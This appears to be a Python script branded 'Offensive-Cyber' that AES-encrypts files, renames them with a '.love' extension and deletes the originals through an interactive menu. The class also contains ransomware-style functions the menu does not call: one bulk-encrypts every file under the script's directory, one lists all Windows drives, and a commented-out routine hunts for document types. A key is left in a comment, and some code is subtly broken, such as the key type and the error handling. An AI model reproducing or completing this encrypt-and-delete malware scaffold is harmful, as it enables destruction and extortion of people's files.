from Crypto import Random
from Crypto.Cipher import AES
import os
import string
import os.path
import sys


class Encryptor:
    def __init__(self, key):
        self.key = key

    def cry(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.cry(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

    def encrypt_file(self, file_name):
        with open(file_name, 'rb') as fo:
            plaintext = fo.read()
        enc = self.encrypt(plaintext, self.key)
        with open(file_name + ".love", 'wb') as fo:
            fo.write(enc)
        os.remove(file_name)

    def drives(self):
        available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
        return available_drives

    def decrypt(self, ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def decrypt_file(self, file_name):
        with open(file_name, 'rb') as fo:
            ciphertext = fo.read()
        dec = self.decrypt(ciphertext, self.key)
        with open(file_name[:-5], 'wb') as fo:
            fo.write(dec)
        os.remove(file_name)

    def getAllFiles(self):
        dir_path = os.path.dirname(os.path.realpath(__file__))
        dirs = []
        for dirName, subdirList, fileList in os.walk(dir_path):
            for fname in fileList:
                if (fname != 'Love.py'):
                    dirs.append(dirName + "\\" + fname)
        return dirs

    def encrypt_all_files(self):
        dirs = self.getAllFiles()
        for file_name in dirs:
            self.encrypt_file(file_name)

    def decrypt_all_files(self):
        dirs = self.getAllFiles()
        for file_name in dirs:
            self.decrypt_file(file_name)

    '''def findfiles(self):
        files = [".txt", ".pdf", ".rar"]
        for i in drives(self):
            for path, subdirs, files in os.walk(f"{i}\\"):
                for name in files:
                    for x in files:
                        if name.endswith(i.lower()):'''


# key = b'[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e'

keys = []
while True:
    os.system("clear")
    print("""   ____   __  __               _                   _____      _               
  / __ \ / _|/ _|             (_)                 / ____|    | |              
 | |  | | |_| |_ ___ _ __  ___ ___   _____ ______| |    _   _| |__   ___ _ __ 
 | |  | |  _|  _/ _ \ '_ \/ __| \ \ / / _ \______| |   | | | | '_ \ / _ \ '__|
 | |__| | | | ||  __/ | | \__ \ |\ V /  __/      | |___| |_| | |_) |  __/ |   
  \____/|_| |_| \___|_| |_|___/_| \_/ \___|       \_____\__, |_.__/ \___|_|   
                                                         __/ |                
                                                        |___/                 
""")
    print("(1). Enter New Key\n(2). Encrypt File\n(3). Decrypt File\n(4). Exit")
    print()
    ch = input("Choice: ")
    if ch == "1":
        os.system("clear")
        key = input(" Please Enter 256BIT Key: ")
        if len(key) != 32:
            input(" [-] Key Is not 256BIT")
            del key
            os.system("clear")
            print()
            print("(1).Enter New Key\n(2).Encrypt File\n(3).Decrypt File\n")
        else:
            keys.append(key)
            input(" [+] Key Seted.")
            print(keys[0])
            input()
            os.system("clear")
    elif ch == "2":
        os.system("clear")
        try:
            if len(keys[0]) != 32:
                input(" [-] Key Is not 256BIT")
                exit()
            if sys.platform.startswith('win'):
                os.system("dir")
                print()
            elif sys.platform.startswith('linux'):
                os.system("ls -lah")
                print()
            try:
                enc = Encryptor(keys[0])
                enc.encrypt_file(str(input(" Enter The Name Of The File to Encrypt: ")))
                input(" [+]File Encrypted")
                os.system("clear")
            except:
                input("File doesn't exist")
                os.system("clear")
        except:
            input(" [-] Key Dind't Set")
    elif ch == "3":
        os.system("clear")
        try:
            if len(keys[0]) != 32:
                input(" [-] Key Is not 256BIT")
                break
            if sys.platform.startswith('win'):
                os.system("dir")
                print()
            elif sys.platform.startswith('linux'):
                os.system("ls -lah")
                print()
            try:
                enc = Encryptor(keys[0])
                enc.decrypt_file(str(input(" Enter The Name Of The File to Decrypt: ")))
                input(" [+]File Dycrypted")
                os.system("clear")
            except:
                input("File doesn't exist")
                os.system("clear")
        except:
            input(" [-] Key Dind't Set")
    elif ch == "4":
        print()
        input("---Exiting---")
        exit()
    else:
        input(" ***invalid choice***")
        os.system("clear")
